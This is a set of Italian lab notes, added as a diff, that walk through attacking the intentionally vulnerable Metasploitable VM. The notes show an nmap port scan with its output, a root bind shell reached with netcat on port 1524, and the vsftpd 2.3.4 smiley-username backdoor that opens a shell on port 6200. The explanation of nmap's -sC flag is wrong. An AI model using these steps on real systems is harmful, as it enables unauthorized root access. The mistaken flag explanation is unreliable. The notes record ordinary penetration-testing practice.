@@ -1,0 +1,68 @@
+SCOPERTA DELL'INDIRIZZO IP
+ping 192.168.56.x --> è emerso che l'indirizzo IP di Metasploitable è 192.168.56.103.
+
+
+
+SCANSIONE DELLE PORTE
+sudo nmap -sS -sV -p- 192.168.56.103 --> l'output prodotto è riportato di seguito:
+	PORT      STATE SERVICE     VERSION
+	21/tcp    open  ftp         vsftpd 2.3.4
+	22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+	23/tcp    open  telnet      Linux telnetd
+	25/tcp    open  smtp        Postfix smtpd
+	53/tcp    open  domain      ISC BIND 9.4.2
+	80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+	111/tcp   open  rpcbind     2 (RPC #100000)
+	139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+	512/tcp   open  exec        netkit-rsh rexecd
+	513/tcp   open  login       OpenBSD or Solaris rlogind
+	514/tcp   open  shell       Netkit rshd
+	1099/tcp  open  java-rmi    GNU Classpath grmiregistry
+	1524/tcp  open  bindshell   Metasploitable root shell
+	2049/tcp  open  nfs         2-4 (RPC #100003)
+	2121/tcp  open  ftp         ProFTPD 1.3.1
+	3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+	3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+	5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+	5900/tcp  open  vnc         VNC (protocol 3.3)
+	6000/tcp  open  X11         (access denied)
+	6667/tcp  open  irc         UnrealIRCd (Admin email admin@Metasploitable.LAN)
+	6697/tcp  open  irc         UnrealIRCd
+	8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
+	8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+	8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+	47343/tcp open  nlockmgr    1-4 (RPC #100021)
+	56926/tcp open  status      1 (RPC #100024)
+	57363/tcp open  mountd      1-3 (RPC #100005)
+	59984/tcp open  java-rmi    GNU Classpath grmiregistry
+	MAC Address: 08:00:27:F7:1C:3C (Oracle VirtualBox virtual NIC)
+	Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+Per rendere la scansione più efficiente, è possibile evitare l'opzione -sV all'inizio e applicarla poi soltanto alle porte che risultano aperte.
+Ad esempio, avrei potuto scrivere i seguenti due comandi:
+	sudo nmap -sS -p- -oN nmap_all_ports.txt -vv 192.168.56.103
+	sudo nmap -sS -sV -sC -p$(cat nmap_all_ports.txt | cut -d "/" -f 1 | tr '\n' ',' | sed 's/,$//') -vv -oN nmap_script.txt 192.168.56.103
+Dove:
+	-sS --> effettua la scansione TCP SYN.
+	-sV --> permette di vedere, per ognuna delle porte scansionate, qual è il servizio associato al quella porta (con la relativa versione).
+	-sC --> permette di scrivere un comando di shell incapsulato nel comando nmap.
+	cut -d "/" -f 1 --> estrae il primo token di ogni riga del file nmap_all_ports.txt (dove il separatore è "/").
+	tr '\n' ',' --> dalla stringa risultante, sostituisce tutti gli '\n' con delle virgole.
+	sed 's/,$//' --> dalla stringa risultante, sostituisce la virgola in fondo con una stringa vuota (i.e. elimina la virgola in fondo).
+	-vv --> fornisce un output verboso.
+	-oN <nome_file> --> riporta l'output all'interno del file <nome_file>.
+
+
+
+OTTENIMENTO DI UNA BIND SHELL COME ROOT
+È stato sufficiente interagire con la porta 1524 --> nc 192.168.56.103 1524
+
+
+
+SFRUTTAMENTO DELLA BACKDOOR IN VSFTPD-2.3.4
+Interazione con la porta 21 --> nc 192.168.56.103 21
+	USER fanfa:)
+	PASS pass
+Dopodiché ho effettuato una nuova scansione delle porte --> sudo nmap -sS -p- 192.168.56.103
+Ho notato che risulta una porta aperta in più --> 6200/tcp
+Dunque, ho lanciato il seguente comando su un nuovo terminale --> nc 192.168.56.103 6200 --> effettivamente ho ottenuto un'altra bind shell.
